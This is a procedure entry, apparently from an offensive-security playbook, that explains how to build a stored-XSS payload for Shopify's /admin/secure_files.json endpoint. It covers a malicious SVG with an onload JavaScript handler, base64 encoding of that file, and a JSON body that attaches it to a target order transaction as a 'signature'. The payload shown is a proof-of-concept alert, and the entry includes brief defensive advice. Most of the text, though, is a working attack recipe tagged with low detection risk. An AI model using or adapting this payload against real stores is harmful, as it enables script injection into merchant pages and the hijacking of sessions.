---
tags:
  - payload-creation
  - xss
  - base64-encoding
  - shopify
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/generate-base64-svg]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T17:29:20.351Z'
skill_level: intermediate
impact_level: medium
detection_risk: low
sub_techniques: []
id: 491fae73-36c0-4459-ad8e-407a6175034b
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Prepare-Payload-for-Signature-File-Upload

## Summary

This procedure crafts a JSON payload for uploading a malicious SVG signature file with embedded JavaScript to a Shopify transaction, using base64 encoding to bypass basic filters.

## Description

The payload targets the `/admin/secure_files.json` endpoint and includes a 'secure_file' object specifying filetype as 'svg', base64-encoded content with JavaScript (e.g., alert for domain confirmation), type as 'signatures', and the target order_transaction_id. This exploits the lack of content validation, allowing client-side script execution when the signature is viewed on order pages. Prerequisites include a known transaction ID; outcomes enable unauthorized file association.

## Requirements

1. Text editor or scripting environment for payload construction
2. Target transaction ID (e.g., from order details)
3. Base64 encoding capability (built-in or via command line)

## Defense

Defensive measures and detection strategies:

- Validate and sanitize uploaded file contents (e.g., strip JS from SVGs)
- Restrict file types and scan for embedded scripts
- Monitor for unusual base64 payloads in logs

## Objectives

1. Create a functional malicious SVG with JS
2. Encode and structure payload for endpoint compatibility
3. Ensure payload targets specific transaction

## Instructions

### Step 1: Create Malicious SVG File

**Context**: Generate an SVG file embedding JavaScript for proof-of-concept execution.

Create a file named `malicious.svg` with content:

```xml
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"></svg>
```

> This triggers a domain alert when loaded, confirming XSS potential.

### Step 2: Encode SVG to Base64

**Context**: Convert the SVG to base64 for inclusion in JSON.

Execute [[commands/generate-base64-svg]] to encode the file:

```bash
base64 malicious.svg > encoded.txt
```

> Output: Base64 string like PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIG9ubG9hZD0iYWxlcnQoZG9jdW1lbnQuZG9tYWluKSI+PC9zdmc+

### Step 3: Assemble JSON Payload

**Context**: Structure the final JSON with encoded content and transaction details.

Use a JSON editor to build:

```json
{
  "secure_file": {
    "filetype": "svg",
    "content": "[BASE64_STRING]",
    "type": "signatures",
    "order_transaction_id": "__Transaction_ID__"
  }
}
```

> Replace placeholders; validate JSON syntax.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used

- [[commands/generate-base64-svg]]

## Tools Used


## Tags

- [[payload-creation]]
- [[xss]]
